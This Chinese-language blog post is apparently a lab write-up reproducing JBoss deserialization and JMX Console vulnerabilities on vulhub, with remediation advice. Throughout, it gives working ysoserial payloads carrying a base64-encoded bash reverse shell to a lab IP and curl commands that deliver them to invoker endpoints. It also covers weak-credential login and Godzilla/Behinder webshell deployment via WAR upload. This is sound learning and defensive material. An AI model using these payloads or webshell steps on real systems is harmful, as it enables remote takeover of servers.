---
title: JBoss 漏洞复现
published: 2025-03-20 23:34:24
image: "./image 40.png"
tags: [漏洞复现,WEB安全]
category: 安全
draft: false
---
# JBoss 漏洞复现

> 复现常见漏洞，面试可能会问到
> 

> 参考文章：https://www.cnblogs.com/arrest/articles/17509983.html | https://blog.csdn.net/m0_48108919/article/details/123919814
> 

## JBoss RCE - **CVE-2017-12149**

该漏洞为 Java反序列化错误类型，存在于 Jboss 的 `HttpInvoker` 组件中的 ReadOnlyAccessFilter 过滤器中。

### 环境搭建

使用 vulhub 搭建，影响版本 `JBoss 5.x 6.x`

![image.png](image%2040.png)

### 漏洞原理

该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。该漏洞出现在`/invoker/readonly`请求中，服务器将用户提交的POST内容进行了Java反序列化。

### 验证漏洞

访问 `/invoker/readonly` 如果返回`500`，说明此页面就可能存在反序列化漏洞

![image.png](image%2041.png)

或者使用工具来检测

![image.png](image%2042.png)

### 漏洞复现

因为不限制用户的`POST`数据，我们就可以常规`Java`反序列化漏洞测试方法来复现该漏洞。

我们使用bash来反弹shell，但由于`Runtime.getRuntime().exec()`中不能使用管道符等bash需要的方法，我们需要用进行一次编码。

我们通过`ysoserial.jar`来生成以`CommonsCollections5`链（目标应用可能使用了 Apache Commons Collections 库的某个版本，该版本存在反序列化漏洞）的`Payload`

```bash
/usr/local/jdk-9.0.4/bin/java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMS4xNjIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}" > getshell.ser
```

然后通过`curl`将反序列化数据发送给靶机

```bash
curl http://192.168.111.170:8080/invoker/readonly --data-binary @getshell.ser --output 1
```

![image.png](image%2043.png)

### 修复建议

修改`web.xml`文件，添加安全约束

```bash
<security-constraint>
    <web-resource-collection>
        <web-resource-name>Restricted Access</web-resource-name>
        <url-pattern>/invoker/*</url-pattern>  <!-- 限制 /invoker/ 目录下的所有请求 -->
    </web-resource-collection>
    <auth-constraint>
        <role-name>admin</role-name>  <!-- 仅允许 admin 角色访问 -->
    </auth-constraint>
    <user-data-constraint>
        <transport-guarantee>CONFIDENTIAL</transport-guarantee>  <!-- 强制使用 HTTPS -->
    </user-data-constraint>
</security-constraint>
```

不需要`http-invoker.sar`组件的直接删除。

将`JBoss`升级`7.x`

## JBoss **CVE-2015-7501**

`JBoss JMXInvokerServlet` 反序列化漏洞

JBoss在`/invoker/JMXInvokerServlet`请求中读取了用户传入的对象，然后我们利用Apache Commons Collections中的Gadget执行任意代码

同时在`JBoss EJBInvokerServlet` 也存在反序列化漏洞，和**CVE-2015-7501**是同样使用的，只是利用路径不同

两者的区别就在于`JMXInvokerServlet`利用的是`org.jboss.invocation.MarshalledValue`进行的反序列化操作

而`EJBInvokerServlet`利用的是`org.jboss.console.remote.RemoteMBeanInvocation`进行反序列化并上传构造的文件

### 环境搭建

使用`vulhub`搭建即可，影响版本：

Red Hat JBoss A-MQ 6.x版本；

BPM Suite (BPMS) 6.x版本；

BRMS 6.x版本和5.x版本；

Data Grid (JDG) 6.x版本；

Data Virtualization (JDV) 6.x版本和5.x版本；

Enterprise Application Platform 6.x版本，5.x版本和4.3.x版本；

Fuse 6.x版本；

Fuse Service Works (FSW) 6.x版本；

Operations Network (JBoss ON) 3.x版本；

Portal 6.x版本；

SOA Platform (SOA-P) 5.x版本；

Web Server (JWS) 3.x版本；

Red Hat OpenShift/xPAAS 3.x版本；

Red Hat Subscription Asset Manager 1.3版本

### 漏洞检测

使用工具检测

![image.png](image%2044.png)

### 漏洞复现

JBoss在处理`/invoker/JMXInvokerServlet`请求的时候读取了对象，所以我们直接将`ysoserial`生成好的POC附在`POST Body`中发送即可。整个过程和 CVE-2017-12149很像。

```bash
/usr/local/jdk-9.0.4/bin/java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMS4xNjIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}" > getshell.ser
```

然后通过`curl`将反序列化数据发送给靶机

```bash
curl http://192.168.111.170:8080/invoker/JMXInvokerServlet --data-binary @getshell.ser --output 1
```

### 修复建议

同上 **CVE-2017-12149**

## JBoss **CVE-2017-7504**

`JBoss AS 4.x`及之前版本中，JbossMQ实现过程的`JMS over HTTP Invocation Layer`的`HTTPServerILServlet.java`文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码

### 环境搭建

使用`vulhub`搭建

![image.png](image%2045.png)

影响版本：

JBoss Enterprise Application Platform 6.4.4,5.2.0,4.3.0_CP10

JBoss AS (Wildly) 6 and earlier

JBoss A-MQ 6.2.0

JBoss Fuse 6.2.0

JBoss SOA Platform (SOA-P) 5.3.1

JBoss Data Grid (JDG) 6.5.0

JBoss BRMS (BRMS) 6.1.0

JBoss BPMS (BPMS) 6.1.0

JBoss Data Virtualization (JDV) 6.1.0

JBoss Fuse Service Works (FSW) 6.0.0

JBoss Enterprise Web Server (EWS) 2.1,3.0

### 漏洞复现

该漏洞出现在`/jbossmq-httpil/HTTPServerILServlet`请求中，我们借助`ysoserial`的`e`、`CommonsCollections5`利用链来复现。生成Payload：

```bash
/usr/local/jdk-9.0.4/bin/java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMS4xNjIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}" > getshell.ser
```

```bash
curl http://192.168.111.170:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @getshell.ser --output 1
```

![image.png](image%2046.png)

### 漏洞修复

升级至最新版本

## JBoss **JMX Console未授权访问**

`jmx-console`控制台下存在像`tomcat`后台一样的控制台，我们可以通过上传war包的形式来上传马达到`getshell`

### 漏洞复现

访问：`http://192.168.111.170:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.deployer:service=BSHDeployer`

如果需要密码则尝试弱密码：`admin:admin:jboss`

进去后找到 `addURL()`

![image.png](image%2047.png)

使用哥斯拉生成`JSP`马命名为`shell.jsp`，在对其进行打包成`war`

![image.png](image%2048.png)

然后开启简易服务器，将连接填入到`ParamValue`里面然后`Invoke`

![image.png](image%2049.png)

然后回到上一步，点击`apply Changes`

![image.png](image%2050.png)

再返回到前面，查看**`jboss.web.deployment`** ，能看到上传的war才算成功

![image.png](image%2051.png)

使用冰蝎连接`JSP`马即可

![image.png](image%2052.png)